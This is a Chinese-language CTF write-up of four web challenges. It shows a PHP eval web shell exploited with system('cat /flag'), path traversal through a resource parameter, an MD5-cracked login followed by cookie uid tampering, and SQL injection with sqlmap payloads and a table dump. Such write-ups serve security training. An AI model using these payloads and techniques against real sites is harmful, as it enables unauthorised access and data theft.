# 跑马场

```php
<?php 

// 真正的强者，敢于把自己的马送给别人
highlight_file(__FILE__);

@eval($_REQUEST['dc64c146a42ea65baf7b5a7d64a50972']);
```

## 代码分析

#### 1. `highlight_file(__FILE__);`

- **作用**：将当前 PHP 文件（即包含此代码的文件）的源代码以 HTML 高亮形式显示给用户。

#### 2. `@eval($_REQUEST['dc64c146a42ea65baf7b5a7d64a50972']);`

- **关键点拆解**：
  - `@`：PHP 的**错误抑制符**，用于隐藏代码执行过程中的错误信息。这会让调试变得困难，但也增加了漏洞利用的隐蔽性。
  - `eval()`：PHP 的内置函数，用于**执行任意 PHP 代码**（字符串形式）。例如：`eval('echo "Hello";');` 会直接输出 `Hello`。
  - `$_REQUEST`：PHP 的**超全局变量**，同时接收来自 GET、POST 或 COOKIE 的参数。
  - `dc64c146a42ea65baf7b5a7d64a50972`：参数名，可能是随机生成或经过哈希处理的，用于混淆，但本质上就是一个普通的参数名（如`?param=value`中的`param`）。

## 漏洞利用

​	`eval(phpcode)`通过eval()函数我们可以向其中注入执行任意php代码。通过分析上面的eval函数中传入了一个超全局变量，param名称为`dc64c146a42ea65baf7b5a7d64a50972`，我们可以构造`https://hostname.com/?dc64c146a42ea65baf7b5a7d64a50972=system("cat /flag")`来执行ls命令并看到输出结果

## 补充

### PHP 超级全局变量

​	PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。

PHP 超级全局变量列表:

- $GLOBALS
- $_SERVER
- $_REQUEST
- $_POST
- $_GET
- $_FILES
- $_ENV
- $_COOKIE
- $_SESSION

# 音乐会

```html
<img src="/get_resource.php?path=static/img/1.jpg">
```

## 代码分析

​	在这到题目中我们可以看见在页面HTML中，通过`get_resource.php`获取到了图片内容并显示到前端中，其中传入的参数为`path`，其值为相对路径。

## 漏洞利用

​	我们可以通过访问`https://hostname.com/get_resource.php?path=flagpath`来获取到flag内容

## 补充

​	我们很难通过相对路径来确定绝对路径，所以我们通过添加../../../../../../../，一直返回到根目录，来获取flag路径。

# Unboxing

![image-20250708163116174](.\assets\image-20250708163116174.png)

​	访问地址我们看到了如下页面，结合题目描述中申先生的账号 ID 是 6，密码的 md5 是 6d8fc80ae8d10ce7d179d9bef28df666，我们就可以获得一个登录账号密码。

​	本题目中的密码通过了md5加密，我们可以通过[md5在线解密破解,md5解密加密](https://www.cmd5.com/default.aspx)这个网站，进行解密，解密结果为kaihe。

![image-20250708163540224](.\assets\image-20250708163540224.png)

​	通过分析发现，在cookie中有一个uid值为6，怀疑该网站存在平级跨权访问漏洞，修改cookie的值为1，显示结果如下。

![image-20250708163721656](.\assets\image-20250708163721656.png)

​	依次访问我们就可以拿到flag。

​	开盒喵

# 图书馆

![image-20250708164521012](.\assets\image-20250708164521012.png)

​	本题目中直接把账号密码传入了sql语句，因此这里有了sql注入点，我们可以构造`admin' OR '1'='1`，这样sql语句就成了`SELECT * FROM users WHERE username = '`admin' OR '1'='1' AND password = ''，条件恒为1，这样就可以登录进入系统里。

​	进入系统之后就可以查看图书，其中访问图书的时候地址为`[图书馆系统 - 图书详情](http://hostname.com/book?id=1`，怀疑id传入的点有sql注入，于是添加'截断字符串，访问地址`http://hostname.com/book?id=1'`，页面输出`查询失败，请重试: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1")`，确认为sql注入点，开始注入工作。

​	之后我们使用注入工具sqlmap进行注入（当然我们也同样可以使用sqlmap来检测注入点）。

​	这里我们通过使用sql注入进入了系统，为了储存我们的登陆状态，我们有自己的cookie，在使用sqlmap时候我们可以使用如下语法`sqlmap -u "https://hostname.com/book?id=1" --cookie="COOKIE"`来检测注入点，输出如下：

```shell
[17:02:50] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5375=5375 AND 'cHSM'='cHSM

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x7162716b71,(SELECT (ELT(9581=9581,1))),0x7171717a71),9581) AND 'XkAv'='XkAv

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4447 FROM (SELECT(SLEEP(5)))OBYc) AND 'mKpu'='mKpu

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7162716b71,0x57785a53554b6a6651566b6155764a544858417671657750414e7054504450776c7a766c4c4c5461,0x7171717a71),NULL,NULL,NULL-- -
---
```

​	发现注入点之后，我们就可以进行利用，我们使用语句`sqlmap -u "https://hostname.com/book?id=1" --cookie="COOKIE" --dbs`查看数据库中的所有库。

```shell
[17:11:51] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] library
[*] mysql
[*] performance_schema
[*] sys
```

​	获取到数据库之后我们就可以使用`-D`指定数据库，使用`--tables`查看数据库中的表。

```shell
[17:13:34] [INFO] fetching tables for database: 'library'
Database: library
[3 tables]
+-------+
| books |
| flag  |
| users |
+-------+
```

​	我们看到了其中有flag表，我们就可以使用`-T`参数指定表，使用`--dump`获取表中的数据。

## 补充

​	详细使用方法可以查看[SQLmap使用教程图文教程（非常详细）从零基础入门到精通，看完这一篇就够了。-CSDN博客](https://blog.csdn.net/dzqxwzoe/article/details/132683722)，感觉写的不错。
